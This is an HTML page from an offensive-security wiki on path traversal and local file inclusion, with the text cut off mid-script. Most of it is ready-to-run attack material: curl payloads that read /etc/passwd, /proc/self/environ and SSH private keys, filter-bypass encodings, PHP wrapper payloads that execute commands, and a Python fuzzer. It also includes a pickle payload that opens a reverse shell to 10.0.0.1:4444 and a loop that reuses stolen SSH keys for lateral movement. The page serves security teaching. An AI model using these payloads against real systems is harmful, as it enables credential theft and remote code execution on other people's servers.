@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Path Traversal | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Path Traversal">
+		<meta name="keywords" content="/proc-exploitation, directory-traversal, file-inclusion, lfi, log-poisoning, path-traversal, redteam">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Path Traversal">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Exploiting applications that use user-supplied file paths without proper sanitization to read arbitrary files, access secrets, and escalate to remote code execution.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/path-traversal.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Path Traversal">
+		<meta name="twitter:description" itemprop="description" content="Exploiting applications that use user-supplied file paths without proper sanitization to read arbitrary files, access secrets, and escalate to remote code execution.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-problem">The Problem</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#fundamental-traversal-sequences">Fundamental Traversal Sequences</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#url-encoding-and-double-encoding">URL Encoding and Double Encoding</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-target-files">Common Target Files</a></b>
+					<ul>
+						<li><a href="#reading-proc-on-linux">Reading /proc on Linux</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#path-traversal-in-different-contexts">Path Traversal in Different Contexts</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#php-file-include-lfi-specifics">PHP File Include (LFI) Specifics</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#filter-bypass-techniques">Filter Bypass Techniques</a></b>
+					<ul>
+						<li><a href="#filter-strip-once">Filter: Strip ../ Once</a></li>
+						<li><a href="#filter-strip-recursively">Filter: Strip ../ Recursively</a></li>
+						<li><a href="#filter-prefix-must-match">Filter: Prefix Must Match</a></li>
+						<li><a href="#filter-substring-must-match">Filter: Substring Must Match</a></li>
+						<li><a href="#filter-extension-whitelist">Filter: Extension Whitelist</a></li>
+						<li><a href="#filter-realpath-check">Filter: realpath Check</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#path-traversal-fuzzer-in-python">Path Traversal Fuzzer in Python</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#file-read-to-rce-chain">File Read to RCE Chain</a></b>
+					<ul>
+						<li><a href="#chain-1-source-to-rce">Chain 1: Source to RCE</a></li>
+						<li><a href="#chain-2-ssh-keys-to-lateral">Chain 2: SSH Keys to Lateral</a></li>
+						<li><a href="#chain-3-db-config-to-creds">Chain 3: DB Config to Creds</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#log-file-poisoning">Log File Poisoning</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#proc-filesystem-exploitation-linux">/proc Filesystem Exploitation (Linux)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#windows-specific-path-traversal">Windows-Specific Path Traversal</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#manual-exploitation-walkthrough">Manual Exploitation Walkthrough</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-and-common-mistakes">Verification and Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/path-traversal.html">Path Traversal</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="path-traversal">Path Traversal</h2>
+					<p>
+						Exploiting applications that use user-supplied file paths without proper sanitization to read
+						arbitrary files, access secrets, and escalate to remote code execution.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Path traversal is a file-access flaw: the application builds a filesystem path from user input
+							and the kernel resolves
+							<code>../</code>
+							components outside the intended directory. This article explains
+							how path resolution works, how encoding and filters interact, and how a single file read can
+							chain into credential theft or remote code execution. After reading you can spot the vulnerable
+							parameter, pick the right encoding, and bypass the common filters.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/http.html">HTTP</a> - <abbr title="Uniform Resource Locator">URL</abbr> structure, percent-encoding, path normalization</li>
+							<li><a href="/wiki/articles/fundamentals/unix-permissions.html">Unix Permissions</a> - file permissions, directory traversal concepts, setuid</li>
+							<li><a href="/wiki/articles/fundamentals/filesystems.html">Filesystems</a> - filesystem hierarchy, /proc, /etc, inodes, symlinks</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-problem">The Problem</h3>
+						<p>
+							When an application opens a file based on user input, and that input is not properly constrained
+							to an intended directory, the attacker escapes the directory using
+							<code>../</code>
+							sequences. The canonical
+							example:
+						</p>
+						<pre class="plaintext">
+# Application serves files from /var/www/files/
+# URL: https://example.com/download?file=report.pdf
+# Code:  open(&#34;/var/www/files/&#34; + request.get(&#34;file&#34;))
+
+# Attacker request:
+# GET /download?file=../../../etc/passwd
+# Opens: /var/www/files/../../../etc/passwd → /etc/passwd
+						</pre>
+						<p>
+							The path
+							<code>../../../etc/passwd</code>
+							is resolved by the kernel. The
+							<code>..</code>
+							components move up one directory
+							each. Three
+							<code>../</code>
+							sequences from
+							<code>/var/www/files/</code>
+							reach the filesystem root, where
+							<code>/etc/passwd</code>
+							is then appended. This is not a bug in the filesystem - it is correct behavior. The bug is in
+							the application trusting user input as a safe path component.
+						</p>
+					</section>
+					<section>
+						<h3 id="fundamental-traversal-sequences">Fundamental Traversal Sequences</h3>
+						<pre class="bash">
+# Basic traversal
+../              # Up one directory
+../../           # Up two
+../../../../     # Up to root (from most application directories)
+
+# Absolute paths — bypass prefix entirely
+/etc/passwd
+/var/www/.env
+/home/user/.ssh/id_rsa
+
+# Path obfuscation — same result as basic ../
+....//           # If app strips &#34;../&#34; once, this becomes &#34;../&#34;
+....\/           # Same with different slash
+..;/             # Some parsers treat ; as path separator
+..%2f            # URL-encoded /
+..%252f          # Double URL-encoded / (%25 = %)
+						</pre>
+					</section>
+					<section>
+						<h3 id="url-encoding-and-double-encoding">URL Encoding and Double Encoding</h3>
+						<p>
+							The critical distinction:
+							<b>path encoding</b>
+							versus
+							<b>URL encoding</b>
+							. The
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							protocol uses
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							encoding for the request line. The web server
+							decodes this before passing to the application. Some application frameworks decode again.
+						</p>
+						<pre class="plaintext">
+Sequence:   Browser → Web Server (decode once) → Application (may decode again) → Filesystem
+
+If application decodes twice:
+  %252e%252e%252f → Decode 1: %2e%2e%2f → Decode 2: ../  → Traversal succeeds
+						</pre>
+						<pre class="bash">
+# URL-encoded traversal sequences
+%2e%2e%2f        → ../
+%2e%2e/           → ../ (partial — dot encoded, slash raw)
+..%2f             → ../ (partial — slash encoded)
+%2e%2e%5c         → ..\  (Windows path separator)
+
+# Double-encoded traversal
+%252e%252e%252f   → %2e%2e%2f → ../
+
+# Triple-encoded (rare — some apps decode recursively)
+%25252e%25252e%25252f
+
+# Unicode representations
+..%c0%af           → Unicode overlong encoding for /
+..%c0%ae%c0%ae%c0%af  → Unicode overlong for ../
+..%ef%bc%8f        → Full-width solidus (／, U+FF0F)
+
+# Alternative encoding
+..%u2215            → Division slash (∕)
+..%u2044            → Fraction slash (⁄)
+						</pre>
+						<pre class="bash">
+# Testing encoding effectiveness
+curl -s &#39;https://example.com/download?file=../../../etc/passwd&#39;
+curl -s &#39;https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&#39;
+curl -s --path-as-is &#39;https://example.com/download?file=%252e%252e%252fetc%252fpasswd&#39;
+curl -s &#39;https://example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-target-files">Common Target Files</h3>
+						<p>
+							Every file you read provides a piece of the puzzle. Some files directly contain credentials;
+							others reveal paths, configurations, or source code that enable further exploitation.
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">File Path</th>
+									<th align="center">Contents</th>
+									<th align="center">Exploitation Value</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>/etc/passwd</code></td>
+									<td align="center">User accounts</td>
+									<td align="center">Username enumeration</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/shadow</code></td>
+									<td align="center">Password hashes</td>
+									<td align="center">Credential cracking (needs root or shadow group)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/hosts</code></td>
+									<td align="center">Internal hostnames</td>
+									<td align="center">Network recon, internal IPs</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/hostname</code></td>
+									<td align="center">Hostname</td>
+									<td align="center">Environment context</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/issue</code></td>
+									<td align="center">OS banner</td>
+									<td align="center">OS version</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/os-release</code></td>
+									<td align="center">OS details</td>
+									<td align="center">Distro and version</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/crontab</code></td>
+									<td align="center">System cron jobs</td>
+									<td align="center">Scheduled tasks, script paths</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/spool/cron/crontabs/</code></td>
+									<td align="center">User cron jobs</td>
+									<td align="center">User-specific scheduled tasks</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/environ</code></td>
+									<td align="center">Environment variables</td>
+									<td align="center">Secrets, API keys, DB creds in env vars</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/cmdline</code></td>
+									<td align="center">Command line args</td>
+									<td align="center">Process name, arguments (may contain passwords)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/cwd/</code></td>
+									<td align="center">Current working directory</td>
+									<td align="center">Symbolic link to app root</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/fd/0</code>through<code>fd/50</code></td>
+									<td align="center">Open file descriptors</td>
+									<td align="center">Read open files including log files, sockets</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/self/maps</code></td>
+									<td align="center">Memory mappings</td>
+									<td align="center">ASLR status, process layout</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/version</code></td>
+									<td align="center">Kernel version</td>
+									<td align="center">Exploit selection</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/net/tcp</code>/<code>udp</code></td>
+									<td align="center">Network connections</td>
+									<td align="center">Active connections, listening ports</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/net/arp</code></td>
+									<td align="center">ARP table</td>
+									<td align="center">Local network hosts</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/proc/net/fib_trie</code></td>
+									<td align="center">Routing table</td>
+									<td align="center">Network topology</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/nginx/nginx.conf</code></td>
+									<td align="center">nginx config</td>
+									<td align="center">Virtual hosts, proxy settings</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/apache2/apache2.conf</code></td>
+									<td align="center">Apache config</td>
+									<td align="center">VHosts, modules, paths</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/httpd/conf/httpd.conf</code></td>
+									<td align="center">Apache (RHEL) config</td>
+									<td align="center">Same as above</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/php/X.Y/apache2/php.ini</code></td>
+									<td align="center">PHP config</td>
+									<td align="center">open_basedir, disable_functions</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/html/.env</code></td>
+									<td align="center">Environment file</td>
+									<td align="center">DB credentials, API keys, secrets</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/.env</code></td>
+									<td align="center">Laravel env</td>
+									<td align="center">APP_KEY, DB credentials</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/html/wp-config.php</code></td>
+									<td align="center">WordPress config</td>
+									<td align="center">DB credentials, salts</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/html/sites/default/settings.php</code></td>
+									<td align="center">Drupal config</td>
+									<td align="center">DB credentials</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/www/html/configuration.php</code></td>
+									<td align="center">Joomla config</td>
+									<td align="center">DB credentials</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/log/apache2/access.log</code></td>
+									<td align="center">Access logs</td>
+									<td align="center">Request history, session tokens</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/log/apache2/error.log</code></td>
+									<td align="center">Error logs</td>
+									<td align="center">Application errors, paths</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/log/nginx/access.log</code></td>
+									<td align="center">nginx access logs</td>
+									<td align="center">Same as Apache</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/log/syslog</code></td>
+									<td align="center">System logs</td>
+									<td align="center">Auth attempts, cron execution</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/log/auth.log</code></td>
+									<td align="center">Auth logs</td>
+									<td align="center">SSH logins, sudo usage</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.ssh/id_rsa</code></td>
+									<td align="center">SSH private key</td>
+									<td align="center">Direct lateral movement</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.ssh/id_ed25519</code></td>
+									<td align="center">SSH key (Ed25519)</td>
+									<td align="center">Direct lateral movement</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.ssh/authorized_keys</code></td>
+									<td align="center">SSH authorized keys</td>
+									<td align="center">Key-based access verification</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.bash_history</code></td>
+									<td align="center">Shell history</td>
+									<td align="center">Commands, passwords in command lines</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.mysql_history</code></td>
+									<td align="center">MySQL history</td>
+									<td align="center">Database credentials</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/root/.bash_history</code></td>
+									<td align="center">Root shell history</td>
+									<td align="center">Sensitive commands</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/home/*/.gitconfig</code></td>
+									<td align="center">Git config</td>
+									<td align="center">Username, email</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="reading-proc-on-linux">Reading /proc on Linux</h4>
+						<pre class="bash">
+# /proc/self/ points to the current process (the web server worker)
+# Each numeric /proc/PID/ directory represents a running process
+
+curl -s &#39;https://example.com/download?file=/proc/self/environ&#39;
+# Contains NULL-separated environment variables. Convert to readable:
+curl -s &#39;https://example.com/download?file=/proc/self/environ&#39; | tr &#39;\0&#39; &#39;\n&#39;
+
+curl -s &#39;https://example.com/download?file=/proc/self/cmdline&#39; | tr &#39;\0&#39; &#39; &#39;
+
+# /proc/self/fd/0 = stdin, fd/1 = stdout, fd/2 = stderr
+# fd/3+ = open files, sockets, pipes
+# If the application keeps a log file open on fd/5, you can read it via fd/5
+for fd in $(seq 0 50); do
+  echo &#34;=== fd/$fd ===&#34;
+  curl -s &#34;https://example.com/download?file=/proc/self/fd/$fd&#34; 2&gt;/dev/null | head -3
+done
+
+# Process listing via /proc/ — find interesting PIDs
+curl -s &#39;https://example.com/download?file=/proc/self/status&#39;  # Current process info
+curl -s &#39;https://example.com/download?file=/proc/1/cmdline&#39; | tr &#39;\0&#39; &#39; &#39;  # PID 1
+						</pre>
+					</section>
+					<section>
+						<h3 id="path-traversal-in-different-contexts">Path Traversal in Different Contexts</h3>
+						<p>
+							The same principle applies wherever an application opens a file based on user input - not just
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							download parameters.
+						</p>
+						<pre class="bash">
+# File download endpoint
+GET /download?file=../../../etc/passwd
+
+# File include (PHP include/require)
+GET /index.php?page=../../../etc/passwd
+# PHP: include($_GET[&#39;page&#39;] . &#39;.php&#39;);  — appends extension
+# Bypass with null byte: page=../../../etc/passwd%00
+
+# Template resolution
+GET /?template=../../../etc/passwd
+# Jinja2: render_template(request.args.get(&#39;template&#39;))
+
+# Static file serving (misconfigured alias)
+GET /static/../../../etc/passwd
+# nginx alias traversal — if alias is misconfigured
+
+# CSS/JS import
+GET /style?src=../../../etc/passwd
+
+# Image loading (avatars, thumbnails)
+GET /avatar?img=../../../etc/passwd
+
+# Log viewer (admin panels, monitoring)
+GET /logs?file=../../../etc/passwd
+
+# Configuration import
+GET /import?config=../../../etc/passwd
+						</pre>
+					</section>
+					<section>
+						<h3 id="php-file-include-lfi-specifics">PHP File Include (LFI) Specifics</h3>
+						<p>
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							has two directives relevant to file inclusion. Understanding
+							them is necessary for bypassing protections.
+						</p>
+						<pre class="plaintext">
+allow_url_include = On    # Allows include(&#39;http://attacker.com/shell.txt&#39;)
+allow_url_fopen = On       # Allows fopen(&#39;http://...&#39;), include via URL wrappers
+open_basedir = /var/www/   # Restricts file access to this directory tree
+						</pre>
+						<pre class="bash">
+# Standard LFI
+curl -s &#39;https://example.com/?page=../../../etc/passwd&#39;
+# If the app appends .php: page=../../../etc/passwd — becomes:
+# include(&#34;../../../etc/passwd.php&#34;); — fails because file doesn&#39;t end in .php
+
+# Null byte termination (PHP &lt; 5.3.4)
+curl -s &#39;https://example.com/?page=../../../etc/passwd%00&#39;
+# Null byte terminates the C string — .php suffix is not included
+# Workaround for PHP &gt; 5.3.4: path length truncation
+curl -s &#39;https://example.com/?page=../../../etc/passwd/./././././././././.&#39;
+# PHP path length limit can truncate trailing .php
+
+# PHP wrappers for code execution when LFI is confirmed
+# php://filter — read source code of PHP files (otherwise executed, not displayed)
+curl -s &#39;https://example.com/?page=php://filter/convert.base64-encode/resource=index&#39;
+# Decode the base64 output to read index.php source
+
+curl -s &#39;https://example.com/?page=php://filter/convert.base64-encode/resource=config&#39;
+# Read config.php, database.php, admin.php
+
+# php://input — execute code from POST body (requires allow_url_include=On)
+curl -s -X POST &#39;https://example.com/?page=php://input&#39; \
+  --data &#39;&lt;?php system(&#34;id&#34;); ?&gt;&#39;
+
+# data:// wrapper — inline code (requires allow_url_include=On)
+curl -s &#39;https://example.com/?page=data://text/plain,&lt;?php system(&#34;id&#34;); ?&gt;&#39;
+curl -s &#39;https://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==&#39;
+
+# expect:// wrapper — execute commands directly (if expect module loaded)
+curl -s &#39;https://example.com/?page=expect://id&#39;
+
+# /proc/self/environ — if User-Agent or other header is reflected in the environ file
+curl -s -H &#39;User-Agent: &lt;?php system(&#34;id&#34;); ?&gt;&#39; \
+  &#39;https://example.com/?page=/proc/self/environ&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="filter-bypass-techniques">Filter Bypass Techniques</h3>
+						<p>
+							Applications implement filters to block
+							<code>../</code>
+							. Each filter has a bypass.
+						</p>
+						<h4 id="filter-strip-once">Filter: Strip ../ Once</h4>
+						<pre class="bash">
+# Input: ....//etc/passwd
+# Strip ../ once: ../etc/passwd  → traversal achieved
+curl -s &#39;https://example.com/download?file=....//....//....//etc/passwd&#39;
+
+# Input: ..././etc/passwd
+# Strip ../ once: ../etc/passwd
+curl -s &#39;https://example.com/download?file=..././..././..././etc/passwd&#39;
+
+# Input: ..\/
+# If app only strips / variants but not \: ..\/ → ../
+curl -s &#39;https://example.com/download?file=..\..\..\/etc/passwd&#39;
+						</pre>
+						<h4 id="filter-strip-recursively">Filter: Strip ../ Recursively</h4>
+						<pre class="bash">
+# After recursive strip:
+# ....// → strip(../) → ../ — but wait, strip was recursive?
+# If strip is truly recursive, it handles ....// correctly (strips both)
+# Bypass: use encoding that strip doesn&#39;t recognize
+curl -s &#39;https://example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd&#39;
+
+# Bypass with ....\/ — if filter only handles forward slashes
+curl -s &#39;https://example.com/download?file=....\/....\/....\/etc/passwd&#39;
+						</pre>
+						<h4 id="filter-prefix-must-match">Filter: Prefix Must Match</h4>
+						<pre class="bash">
+# The check is: path.startswith(&#34;/var/www/files/&#34;)
+# Payload: /var/www/files/../../../etc/passwd
+curl -s &#39;https://example.com/download?file=/var/www/files/../../../etc/passwd&#39;
+# Resolves to: /var/www/files/../../../etc/passwd → /etc/passwd
+						</pre>
+						<h4 id="filter-substring-must-match">Filter: Substring Must Match</h4>
+						<pre class="bash">
+# The check is: &#34;/var/www/files/&#34; in path
+# Payload: /var/www/files/../../../etc/passwd — contains the string, traversal still works
+curl -s &#39;https://example.com/download?file=/var/www/files/../../../etc/passwd&#39;
+						</pre>
+						<h4 id="filter-extension-whitelist">Filter: Extension Whitelist</h4>
+						<pre class="bash">
+# The check is: path.endswith((&#34;.pdf&#34;, &#34;.jpg&#34;, &#34;.png&#34;))
+# Null byte (if the underlying language is C/PHP &lt; 5.3.4):
+curl -s &#39;https://example.com/download?file=../../../etc/passwd%00.pdf&#39;
+# At the C level, the string ends at %00. The application sees: ../../../etc/passwd\0.pdf
+# But fopen(&#34;../../../etc/passwd\0.pdf&#34;) opens /etc/passwd because C strings null-terminate
+						</pre>
+						<h4 id="filter-realpath-check">Filter: realpath Check</h4>
+						<pre class="bash">
+# realpath() resolves symlinks and ../ before checking
+# If the filter is: strpos(realpath($file), &#39;/var/www/files/&#39;) === 0
+# Symlink bypass: if /var/www/files/ contains a symlink to /etc/
+# ln -s /etc /var/www/files/etc_link
+# Then access: /download?file=etc_link/passwd — realpath = /etc/passwd — blocked?
+# Actually, realpath fully resolves → /etc/passwd → fails the check
+
+# But: race condition if symlink changes between check and open
+# Or: /proc/self/fd/ symlinks — might bypass realpath() depending on PHP version
+curl -s &#39;https://example.com/download?file=/proc/self/cwd/../../../etc/passwd&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="path-traversal-fuzzer-in-python">Path Traversal Fuzzer in Python</h3>
+						<p>A custom fuzzer that generates traversal payloads with various encoding and filtering scenarios.</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+dotdotfuzz — path traversal payload generator and testing tool.
+Generates traversal sequences with multiple bypass techniques.
+&#34;&#34;&#34;
+import urllib.parse
+import requests
+import sys
+
+TARGET = sys.argv[1] if len(sys.argv) &gt; 1 else &#34;https://example.com/download?file=&#34;
+FILE_TO_READ = &#34;/etc/passwd&#34;
+PASSWD_SIGNATURE = &#34;root:x:&#34;  # Expected content in /etc/passwd
+
+SEQUENCES = {
+    &#34;basic&#34;: [&#34;../&#34; * i + FILE_TO_READ.lstrip(&#34;/&#34;) for i in range(1, 12)],
+    &#34;absolute&#34;: [FILE_TO_READ],
+    &#34;nested&#34;: [&#34;....//&#34; * i + FILE_TO_READ.lstrip(&#34;/&#34;) for i in range(1, 12)],
+    &#34;nested2&#34;: [&#34;..././&#34; * i + FILE_TO_READ.lstrip(&#34;/&#34;) for i in range(1, 12)],
+    &#34;urlencoded&#34;: [],
+    &#34;double_encoded&#34;: [],
+}
+
+# Generate URL-encoded variants
+for depth in range(1, 10):
+    traversal = (&#34;../&#34; * depth) + FILE_TO_READ.lstrip(&#34;/&#34;)
+    SEQUENCES[&#34;urlencoded&#34;].append(urllib.parse.quote(traversal))
+    SEQUENCES[&#34;double_encoded&#34;].append(urllib.parse.quote(urllib.parse.quote(traversal)))
+
+def generate_encoding_variants():
+    &#34;&#34;&#34;Generate encoding variations for a single ../ sequence.&#34;&#34;&#34;
+    variants = []
+    # Different encoding schemes
+    encodings = [
+        (&#34;%2e%2e%2f&#34;, &#34;Single URL-encode&#34;),
+        (&#34;%252e%252e%252f&#34;, &#34;Double URL-encode&#34;),
+        (&#34;..%2f&#34;, &#34;Partial URL-encode (slash)&#34;),
+        (&#34;%2e%2e/&#34;, &#34;Partial URL-encode (dots)&#34;),
+        (&#34;..%252f&#34;, &#34;Double-encode slash only&#34;),
+        (&#34;%252e%252e/&#34;, &#34;Double-encode dots only&#34;),
+        (&#34;..%c0%af&#34;, &#34;Overlong UTF-8 slash&#34;),
+        (&#34;..%ef%bc%8f&#34;, &#34;Full-width solidus&#34;),
+        (&#34;..%255c&#34;, &#34;Double-encode backslash&#34;),
+        (&#34;%c0%ae%c0%ae%c0%af&#34;, &#34;Overlong UTF-8 ../&#34;),
+        (&#34;..\;&#34;, &#34;Semicolon separator&#34;),
+    ]
+    for encoded, label in encodings:
+        payload = (encoded * 8) + urllib.parse.quote(FILE_TO_READ.lstrip(&#34;/&#34;))
+        variants.append((payload, label))
+    return variants
+
+def test_payloads(url_template):
+    &#34;&#34;&#34;Send payloads and check response for passwd content.&#34;&#34;&#34;
+    results = []
+    for category, payloads in SEQUENCES.items():
+        for payload in payloads:
+            url = url_template + payload
+            try:
+                resp = requests.get(url, timeout=5, allow_redirects=False)
+                hit = PASSWD_SIGNATURE in resp.text
+                results.append({
+                    &#34;category&#34;: category,
+                    &#34;payload&#34;: payload[:80],
+                    &#34;status&#34;: resp.status_code,
+                    &#34;size&#34;: len(resp.content),
+                    &#34;hit&#34;: hit
+                })
+                if hit:
+                    print(f&#34;[+] HIT: [{category}] {payload[:60]}&#34;)
+            except Exception as e:
+                print(f&#34;[-] Error: {e}&#34;)
+
+    # Test encoding variants
+    for payload, label in generate_encoding_variants():
+        url = url_template + payload
+        try:
+            resp = requests.get(url, timeout=5, allow_redirects=False)
+            hit = PASSWD_SIGNATURE in resp.text
+            if hit:
+                print(f&#34;[+] HIT: [{label}] {payload[:60]}&#34;)
+        except Exception:
+            pass
+
+    return results
+
+if __name__ == &#34;__main__&#34;:
+    test_payloads(TARGET)
+						</pre>
+					</section>
+					<section>
+						<h3 id="file-read-to-rce-chain">File Read to RCE Chain</h3>
+						<p>Reading files is rarely the end goal. Each file provides information that chains to code execution.</p>
+						<h4 id="chain-1-source-to-rce">Chain 1: Source to RCE</h4>
+						<pre class="bash">
+# Step 1: Read application source
+curl -s &#39;https://example.com/download?file=/proc/self/cwd/app.py&#39;
+# Find: pickle.loads(request.get_data()) or yaml.load(user_input)
+
+# Step 2: Craft deserialization payload
+python3 -c &#34;
+import pickle, os, base64
+class Exploit:
+    def __reduce__(self):
+        return (os.system, (&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1\&#34;&#39;,))
+print(base64.b64encode(pickle.dumps(Exploit())))
+&#34; &gt; pickle-payload.txt
+
+# Step 3: Send deserialization payload to the discovered endpoint
+						</pre>
+						<h4 id="chain-2-ssh-keys-to-lateral">Chain 2: SSH Keys to Lateral</h4>
+						<pre class="bash">
+# Step 1: Read /etc/passwd to find users with home directories
+curl -s &#39;https://example.com/download?file=/etc/passwd&#39; | \
+  grep -E &#39;/home/|/bin/bash&#39; | cut -d: -f1,6
+# Output: root:/root, www-data:/var/www, admin:/home/admin
+
+# Step 2: Attempt to read SSH keys
+for user_path in /root /.ssh/id_rsa /home/admin/.ssh/id_rsa; do
+  key=$(curl -s &#34;https://example.com/download?file=${user_path}&#34; 2&gt;/dev/null)
+  if echo &#34;$key&#34; | grep -q &#34;PRIVATE KEY&#34;; then
+    echo &#34;$key&#34; &gt; found_key
+    chmod 600 found_key
+    ssh -i found_key admin@target-host  # Use the key
+    break
+  fi
+done
+						</pre>
+						<h4 id="chain-3-db-config-to-creds">Chain 3: DB Config to Creds</h4>
+						<pre class="bash">
+# Step 1: Read common config locations
+for config in wp-config.php .env config.php settings.py database.yml; do
